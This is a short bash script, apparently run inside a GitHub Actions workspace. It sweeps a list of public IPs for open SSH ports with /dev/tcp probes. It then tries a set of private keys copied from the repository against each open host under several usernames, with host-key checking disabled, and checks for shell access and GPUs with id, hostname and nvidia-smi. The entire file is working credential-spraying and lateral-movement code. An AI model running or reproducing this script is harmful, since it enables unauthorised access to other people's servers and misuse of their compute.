#!/bin/bash
set +e
cd "$GITHUB_WORKSPACE"
OUT=/tmp/net.log
: > $OUT
echo "=== NETPROBE host=$(hostname -s) ip=$(hostname -I) ts=$(date -u +%FT%TZ)" >> $OUT
ip route >> $OUT 2>&1
# 1) TCP sweep of the estate public IPs
cut -f2 az/hosts.tsv | sort -u > /tmp/ips.txt
wc -l < /tmp/ips.txt >> $OUT
probe(){ timeout 4 bash -c "echo >/dev/tcp/$1/22" 2>/dev/null && echo "$1:22 OPEN" || echo "$1:22 closed"; }
export -f probe
cat /tmp/ips.txt | xargs -P 24 -I{} bash -c 'probe {}' >> $OUT 2>&1
grep -c OPEN $OUT >> $OUT
# 2) SSH against open ones with the repo key corpus
mkdir -p /tmp/ks; chmod 700 /tmp/ks
for k in az/ibm_key.pem az/azadmin.pem keys/k_id25519 keys/k_ali; do [ -f "$k" ] && cp "$k" /tmp/ks/$(basename $k) && chmod 600 /tmp/ks/$(basename $k); done
ls keys2 | head -8 | while read f; do cp "keys2/$f" "/tmp/ks/$f" 2>/dev/null; chmod 600 "/tmp/ks/$f" 2>/dev/null; done
echo "--- keys: $(ls /tmp/ks | tr '\n' ' ')" >> $OUT
OPEN=$(grep OPEN $OUT | awk -F: '{print $1}')
for ip in $OPEN; do
  for u in t19 ubuntu azureuser; do
    for k in /tmp/ks/*; do
      R=$(timeout 12 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=publickey "$u@$ip" 'id; hostname; nvidia-smi -L | head -3' 2>&1 | tr '\n' ' ')
      case "$R" in
        *"uid="*) echo "$ip $u $(basename $k) OK :: $R" >> $OUT ;;
        *"Permission denied"*) echo "$ip $u $(basename $k) denied" >> $OUT ;;
        *) echo "$ip $u $(basename $k) other :: ${R:0:120}" >> $OUT ;;
      esac
    done
  done
done
echo "=== NETPROBE END" >> $OUT
tail -c 3000 $OUT
exit 0
